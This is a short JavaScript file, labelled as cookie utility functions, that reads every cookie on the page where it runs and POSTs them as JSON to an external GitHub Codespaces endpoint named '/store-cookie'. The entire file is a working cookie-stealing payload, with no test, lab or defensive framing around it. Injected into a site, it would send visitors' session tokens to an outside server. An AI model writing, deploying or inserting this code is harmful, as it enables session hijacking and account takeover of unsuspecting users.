// Cookie utility functions
const CookieExtractor = {
    // Get all cookies for the current domain
    getAllCookies() {
        const cookies = document.cookie.split(';');
        const cookieList = [];
        cookies.forEach(cookie => {
            const [name, value] = cookie.trim().split('=');
            cookieList.push({
                name: decodeURIComponent(name),
                value: decodeURIComponent(value),
                domain: window.location.hostname,
                path: '/',
                secure: window.location.protocol === 'https:',
                timestamp: new Date().toISOString()
            });
        });
        return cookieList;
    },
 
    // Main function to extract and handle cookies
    extractCookies() {
        try {
            const cookies = this.getAllCookies();
            return cookies;
        } catch (error) {
            console.error('Error extracting cookies:', error);
            return null;
        }
    }
};
 
// Extract cookies
const extractedCookies = CookieExtractor.extractCookies();
 
// Define the API endpoint
const apiEndpoint = "https://cuddly-halibut-6xp55wwxr96cxrr6-3000.app.github.dev/store-cookie";
 
// Prepare data to send in the correct structure
const data = JSON.stringify({ cookies: extractedCookies });
 
// Make a POST request to the API to send the cookies
fetch(apiEndpoint, {
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    body: data
})
.then(response => response.json())
.then(data => {
    console.log("Cookie data sent successfully:", data);
})
.catch(error => {
    console.error("Error sending cookie data:", error);
});